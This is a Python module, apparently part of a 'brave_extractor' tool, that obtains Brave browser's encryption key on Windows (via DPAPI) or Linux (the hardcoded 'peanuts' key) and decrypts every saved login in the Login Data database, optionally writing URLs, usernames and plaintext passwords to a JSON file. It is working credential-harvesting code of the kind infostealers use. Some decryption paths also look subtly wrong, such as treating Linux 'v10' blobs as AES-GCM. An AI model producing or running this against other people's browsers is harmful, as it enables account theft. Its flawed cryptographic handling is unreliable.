#!/usr/bin/env python3
"""
Brave Browser Crypto Utilities
-----------------------------
Utilities for handling encrypted data in Brave browser.
"""

import os
import sys
import base64
import platform
import json
import sqlite3
import logging
import shutil

logger = logging.getLogger('brave_extractor.crypto')

# Try importing various crypto libraries depending on platform
try:
    from Crypto.Cipher import AES
    PYCRYPTO_AVAILABLE = True
except ImportError:
    PYCRYPTO_AVAILABLE = False

try:
    import win32crypt
    WIN32CRYPT_AVAILABLE = True
except ImportError:
    WIN32CRYPT_AVAILABLE = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False


def get_encryption_key_windows():
    """Get the encryption key used by Brave on Windows."""
    if not WIN32CRYPT_AVAILABLE:
        logger.error("win32crypt is required for Windows decryption but not installed")
        return None
        
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Local State')
    
    if not os.path.exists(local_state_path):
        logger.error(f"Local State file not found: {local_state_path}")
        return None
    
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    # Extract the encrypted_key
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    # Remove 'DPAPI' prefix
    encrypted_key = encrypted_key[5:]
    
    # Decrypt the key using CryptUnprotectData
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    return decrypted_key


def get_encryption_key_linux():
    """Get the encryption key used by Brave on Linux."""
    # On Linux, Brave uses a hardcoded password
    password = 'peanuts'.encode('utf-8')
    salt = b'saltysalt'
    
    if not CRYPTOGRAPHY_AVAILABLE:
        logger.error("cryptography is required for Linux decryption but not installed")
        return None
    
    # Import here to avoid errors on Windows
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    
    # Derive key using PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=salt,
        iterations=1
    )
    
    return kdf.derive(password)


def get_encryption_key():
    """Get the appropriate encryption key based on the platform."""
    system = platform.system()
    
    if system == 'Windows':
        return get_encryption_key_windows()
    elif system == 'Linux':
        return get_encryption_key_linux()
    else:
        logger.error(f"Unsupported OS: {system}")
        return None


def decrypt_password_windows(encrypted_password, key):
    """Decrypt a password on Windows."""
    if not PYCRYPTO_AVAILABLE:
        logger.error("pycryptodome is required for Windows decryption but not installed")
        return None
        
    try:
        # Check if password was encrypted with AES-GCM (Brave v80+)
        if encrypted_password[0:3] == b'v10':
            # Remove the 'v10' prefix
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:]
            
            # Decrypt using AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt(ciphertext)[:-16]  # Remove auth tag
            return decrypted.decode('utf-8')
        
        # Older versions used DPAPI directly
        return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
    except Exception as e:
        logger.error(f"Error decrypting password on Windows: {e}")
        return None


def decrypt_password_linux(encrypted_password, key):
    """Decrypt a password on Linux."""
    if not PYCRYPTO_AVAILABLE:
        logger.error("pycryptodome is required for Linux decryption but not installed")
        return None
    
    try:
        # Remove 'v10' prefix if present (Brave v80+)
        if encrypted_password.startswith(b'v10'):
            # Handle AES-GCM encryption (v80+)
            encrypted_password = encrypted_password[3:]  # Remove 'v10' prefix
            nonce = encrypted_password[0:12]
            ciphertext = encrypted_password[12:]
            
            if CRYPTOGRAPHY_AVAILABLE:
                # Use cryptography library for AES-GCM
                aesgcm = AESGCM(key)
                decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                return decrypted.decode('utf-8')
            elif PYCRYPTO_AVAILABLE:
                # Use pycryptodome for AES-GCM
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt(ciphertext)
                return decrypted[:-16].decode('utf-8')  # Remove auth tag
        
        # Older versions used AES-CBC
        iv = b' ' * 16
        if PYCRYPTO_AVAILABLE:
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)
            decrypted = cipher.decrypt(encrypted_password)
            # Remove PKCS#7 padding
            padding_len = decrypted[-1]
            if padding_len < 16:
                decrypted = decrypted[:-padding_len]
            return decrypted.decode('utf-8')
        
        return None
    except Exception as e:
        logger.error(f"Error decrypting password on Linux: {e}")
        return None


def decrypt_password(encrypted_password):
    """Decrypt a password using the appropriate method for the current platform."""
    if not encrypted_password:
        return ""
        
    # Convert to bytes if it's not already
    if isinstance(encrypted_password, str):
        try:
            encrypted_password = encrypted_password.encode('utf-8')
        except Exception:
            encrypted_password = base64.b64decode(encrypted_password)
    
    key = get_encryption_key()
    if not key:
        logger.error("Unable to get encryption key")
        return None
    
    system = platform.system()
    
    if system == 'Windows':
        return decrypt_password_windows(encrypted_password, key)
    elif system == 'Linux':
        return decrypt_password_linux(encrypted_password, key)
    else:
        logger.error(f"Unsupported OS: {system}")
        return None


def decrypt_passwords_db(db_path, output_path=None):
    """
    Decrypt passwords from a Brave Login Data database.
    Returns a list of dictionaries with the decrypted passwords.
    If output_path is provided, also writes the results to a JSON file.
    """
    if not os.path.exists(db_path):
        logger.error(f"Database file not found: {db_path}")
        return []
    
    # Create a copy of the database to avoid lock issues
    temp_db = os.path.join(os.path.dirname(db_path), "temp_login_data")
    try:
        shutil.copy2(db_path, temp_db)
        
        results = []
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Get the data
            cursor.execute('''
                SELECT origin_url, username_value, password_value
                FROM logins ORDER BY date_created
            ''')
            
            for url, username, password in cursor.fetchall():
                decrypted_password = decrypt_password(password)
                
                if decrypted_password:
                    results.append({
                        'url': url,
                        'username': username,
                        'password': decrypted_password
                    })
            
            if output_path:
                with open(output_path, 'w') as f:
                    json.dump(results, f, indent=2)
                logger.info(f"Passwords exported to {output_path}")
                
            return results
            
        except Exception as e:
            logger.error(f"Error decrypting passwords database: {e}")
            return []
        finally:
            if 'conn' in locals():
                conn.close()
                
    except Exception as e:
        logger.error(f"Error copying database: {e}")
        return []
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception:
                pass


if __name__ == "__main__":
    # Simple test if run directly
    logging.basicConfig(level=logging.INFO)
    
    system = platform.system()
    if system == 'Windows':
        db_path = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data')
    else:
        db_path = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default/Login Data')
    
    if os.path.exists(db_path):
        passwords = decrypt_passwords_db(db_path)
        print(f"Found {len(passwords)} passwords") 